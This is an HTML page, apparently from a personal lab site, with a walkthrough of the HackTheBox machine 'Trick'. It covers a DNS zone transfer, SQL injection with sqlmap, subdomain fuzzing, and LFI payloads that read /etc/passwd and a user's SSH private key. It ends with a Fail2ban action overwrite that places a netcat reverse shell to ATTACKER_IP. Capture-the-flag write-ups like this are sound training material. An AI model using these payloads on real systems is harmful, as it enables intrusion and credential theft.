@@ -1,0 +1,284 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="icon" type="image/x-icon" href="../images/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB - Trick</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            line-height: 1.6;
+            color: #222;
+        }
+
+        h1 { margin-bottom: 10px; }
+        h2 { margin-top: 40px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
+        h3 { margin-top: 25px; }
+
+        img {
+            margin: 15px 0;
+            max-width: 100%;
+            border: 1px solid #ccc;
+        }
+
+        pre {
+            background: #f4f4f4;
+            padding: 12px;
+            overflow-x: auto;
+            border-left: 4px solid #ccc;
+        }
+
+        code { font-family: Consolas, monospace; }
+
+        a { color: #0366d6; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .navbar {
+            margin-bottom: 30px;
+            padding: 10px 0;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .nav-item {
+            margin-right: 20px;
+            color: #0366d6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .nav-item.active {
+            color: black;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="navbar">
+    <a href="../index.html" class="nav-item">Home</a>
+    <a href="../soc_lab_setup.html" class="nav-item">Lab Setup</a>
+    <a href="../case_1.html" class="nav-item">Case 1</a>
+    <a href="../case_2.html" class="nav-item">Case 2</a>
+        <a href="../case_3.html" class="nav-item">Case 3</a>
+    <a href="../ad_attacks_lab.html" class="nav-item">Active Directory Attacks</a>
+    <a href="../more_tools.html" class="nav-item">More Tools</a>
+    <a href="../htb.html" class="nav-item active">HackTheBox</a>
+<a href="../vulnhub.html" class="nav-item">Vulnhub</a>
+<a href="../offsec_proving_grounds.html" class="nav-item">Offsec Proving Grounds</a>
+</div>
+
+<!-- -->
+<h1>Trick (HTB – Easy)</h1>
+
+<p>
+Trick is a DNS‑focused machine where a zone transfer reveals hidden subdomains.  
+One subdomain contains a SQL‑injectable login form, while another exposes a file inclusion vulnerability that leaks an SSH key.  
+Privilege escalation is achieved by abusing a misconfigured Fail2ban action script to trigger a root reverse shell.
+</p>
+
+<h2>Overview</h2>
+<p>
+Target: trick.htb  
+<br>Initial vector: DNS zone transfer → SQL injection → LFI → SSH key  
+<br>Privilege escalation: Fail2ban action.d overwrite → root shell  
+</p>
+
+<h2>Enumeration</h2>
+
+<p>Nmap:</p>
+<pre>
+22/tcp ssh
+25/tcp smtp
+53/tcp dns (BIND)
+80/tcp http (nginx)
+</pre>
+
+<p>
+Add <code>trick.htb</code> to <code>/etc/hosts</code>.  
+Nothing interesting on port 80, so enumerate DNS.
+</p>
+
+<h3>DNS Zone Transfer</h3>
+
+<pre>
+$ dig axfr trick.htb @trick.htb
+</pre>
+
+<p>
+The zone transfer succeeds and reveals a new subdomain:
+</p>
+
+<pre>
+preprod-payroll.trick.htb
+</pre>
+
+<p>
+Add it to <code>/etc/hosts</code>.
+</p>
+
+<h2>Foothold – SQL Injection on preprod-payroll</h2>
+
+<p>
+The login form is vulnerable to SQL injection.  
+Intercept the request (browser devtools or Burp) and feed it to sqlmap:
+</p>
+
+<pre>
+$ sqlmap -r request.txt --dbs
+-> payroll_db
+</pre>
+
+<p>
+Dump the users table:
+</p>
+
+<pre>
+$ sqlmap -r request.txt -D payroll_db -T users --dump
+</pre>
+
+<p>
+Credentials allow login, but the panel contains nothing useful.  
+Time to enumerate more subdomains.
+</p>
+
+<h3>Subdomain Discovery</h3>
+
+<p>
+Because <code>preprod-payroll</code> exists, try other “preprod‑” names.  
+Generate a wordlist and fuzz:
+</p>
+
+<pre>
+$ wfuzz -H "Host: FUZZ.trick.htb" -w subdomains-top1million-5000.txt http://trick.htb
+-> preprod-marketing.trick.htb
+</pre>
+
+<p>
+Add it to <code>/etc/hosts</code>.
+</p>
+
+<h2>LFI – Extracting michael’s SSH Key</h2>
+
+<p>
+The new subdomain contains a <code>page</code> parameter vulnerable to directory traversal:
+</p>
+
+<pre>
+?page=../../../../../../etc/passwd
+</pre>
+
+<p>
+This reveals user <code>michael</code>.  
+Extract his SSH key:
+</p>
+
+<pre>
+?page=../../../../../../home/michael/.ssh/id_rsa
+</pre>
+
+<p>
+Copy the key, save it locally, and fix permissions:
+</p>
+
+<pre>
+$ chmod 600 id_rsa
+$ ssh -i id_rsa michael@trick.htb
+</pre>
+
+<p>
+User shell obtained.
+</p>
+
+<h2>Privilege Escalation – Fail2ban Misconfiguration</h2>
+
+<p>
+Check sudo permissions:
+</p>
+
+<pre>
+$ sudo -l
+-> (root) NOPASSWD: /etc/init.d/fail2ban restart
+</pre>
+
+<p>
+Michael belongs to the <code>security</code> group, which has write access to Fail2ban action files:
+</p>
+
+<pre>
+/etc/fail2ban/action.d/
+</pre>
+
+<p>
+Copy an action file to your home directory:
+</p>
+
+<pre>
+$ cp /etc/fail2ban/action.d/iptables-multiport.conf ~/
+</pre>
+
+<p>
+Edit the <code>[actionban]</code> section to include a reverse shell:
+</p>
+
+<pre>
+actionban = /usr/bin/nc ATTACKER_IP 4444 -e /bin/bash
+</pre>
+
+<p>
+Overwrite the original:
+</p>
+
+<pre>
+$ mv iptables-multiport.conf /etc/fail2ban/action.d/
+</pre>
+
+<p>Restart Fail2ban:</p>
+<pre>
+$ sudo /etc/init.d/fail2ban restart
+</pre>
+
+<p>
+Trigger the ban by intentionally failing SSH logins:
+</p>
+
+<pre>
+$ ssh fakeuser@trick.htb
+</pre>
+
+<p>
+Listener on attacker:
+</p>
+
+<pre>
+$ nc -nlvp 4444
+</pre>
+
+<p>
+A root shell is received.
+</p>
+
+<h2>Conclusion</h2>
+<p>
+Trick is a well‑designed chain: DNS zone transfer → SQL injection → subdomain discovery → LFI → SSH key → Fail2ban
+misconfiguration → root.  
+It highlights the importance of DNS enumeration and the dangers of insecure automation scripts.
+</p>
+
+
+
+<!-- -->
+
+</body>
+</html>
+
+
+
+
+
+
+
